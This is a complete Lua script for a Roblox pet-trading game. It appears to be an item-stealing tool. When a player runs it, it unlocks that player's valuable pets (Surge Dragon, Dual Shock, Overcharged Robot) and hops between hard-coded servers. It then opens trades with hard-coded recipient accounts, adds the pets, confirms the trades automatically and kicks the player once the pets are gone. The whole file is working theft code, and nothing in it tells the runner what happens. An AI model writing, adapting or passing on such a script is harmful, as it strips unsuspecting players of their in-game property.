-- CONFIG
local targetUsernames = {"Keiyoz", "Ebikeu", "MALIKSTOM"}
local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
local targetJobIds = {
	"ed3d6e54-88c5-4793-a660-fc4cd47158ed",
	"131bbf2a-9394-41c9-9440-a8c3a398fff2",
	"a139717e-7107-4bf2-b2db-4f5ddbc799e0"
}

-- SERVICES
local Players = game:GetService("Players")
local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
local TeleportService = game:GetService("TeleportService")

-- VARIABLES
local player = Players.LocalPlayer
local attemptedJobs = {}

-- UTILS
local function WaitForCondition(fn, timeout)
	local t0 = os.clock()
	while not fn() do
		if os.clock() - t0 > (timeout or 30) then
			return false
		end
		task.wait(0.2)
	end
	return true
end

local function WaitForPets(timeout)
	local t0 = os.clock()
	while os.clock() - t0 < (timeout or 30) do
		local pets = Replication.Data and Replication.Data.Pets
		if pets and next(pets) ~= nil then
			return pets
		end
		task.wait(0.2)
	end
	return Replication.Data and Replication.Data.Pets
end

-- PET LOGIC
local function UnlockPets()
	local lookup = {}
	for _, n in ipairs(petsToTrade) do
		lookup[n] = true
	end

	local pets = WaitForPets(20)
	if not pets then return end

	for _, petData in pairs(pets) do
		if petData
			and petData.Id
			and petData.Name
			and lookup[petData.Name]
			and petData.Locked
		then
			Network:InvokeServer("LockPet", petData.Id, false)
		end
	end
end

local function GetPetIDsByName()
	local ids = {}
	local lookup = {}
	for _, n in ipairs(petsToTrade) do
		lookup[n] = true
	end

	local pets = WaitForPets(20)
	if not pets then return ids end

	for _, petData in pairs(pets) do
		if petData
			and petData.Id
			and petData.Name
			and lookup[petData.Name]
		then
			table.insert(ids, petData.Id)
		end
	end

	return ids
end

local function HasPetsToTrade()
	local ids = GetPetIDsByName()
	return #ids > 0
end

-- JOB / SERVER LOGIC
local function TeleportToJob(jobId)
	while true do
		local ok = pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId)
		end)
		if ok then break end
		task.wait(20)
	end
end

local function GetRandomJobId()
	local pool = {}
	for _, id in ipairs(targetJobIds) do
		if not attemptedJobs[id] then
			table.insert(pool, id)
		end
	end

	if #pool == 0 then
		attemptedJobs = {}
		return targetJobIds[math.random(#targetJobIds)]
	end

	return pool[math.random(#pool)]
end

local function IsInTargetJob()
	for _, id in ipairs(targetJobIds) do
		if game.JobId == id then
			return true
		end
	end
	return false
end

local function FindTargetPlayer()
	for _, name in ipairs(targetUsernames) do
		local p = Players:FindFirstChild(name)
		if p then return p end
	end
	return nil
end

local function JoinRandomJob()
	while true do
		local jobId = GetRandomJobId()
		attemptedJobs[jobId] = true
		TeleportToJob(jobId)

		local loaded = WaitForCondition(function()
			return game:IsLoaded() and Players.LocalPlayer
		end, 15)

		if loaded then
			task.wait(5)
			if IsInTargetJob() then
				return
			end
		end
	end
end

-- TRADE LOGIC
local function TradeWithTarget()
	while true do
		UnlockPets()

		if not HasPetsToTrade() then
			player:Kick("No more pets to trade")
			return
		end

		local target = FindTargetPlayer()
		if not target then
			task.wait(5)
			return
		end

		Network:FireServer("SendTrade", target)

		local tradeOpened = WaitForCondition(function()
			return player.PlayerGui.Trading.Enabled
		end, 15)

		if not tradeOpened then
			task.wait(5)
			return
		end

		local petIDs = GetPetIDsByName()
		for _, id in ipairs(petIDs) do
			Network:InvokeServer("AddTradeItem", {"Pet", id})
		end

		Network:FireServer("ReadyUp", false, true)

		WaitForCondition(function()
			return not player.PlayerGui.Trading.Enabled
		end, 30)

		task.wait(5)
	end
end

-- MAIN
WaitForPets(20)

if not HasPetsToTrade() then
	player:Kick("No more pets to trade")
	return
end

if IsInTargetJob() then
	TradeWithTarget()
else
	while true do
		JoinRandomJob()
		TradeWithTarget()
		task.wait(1)
	end
end
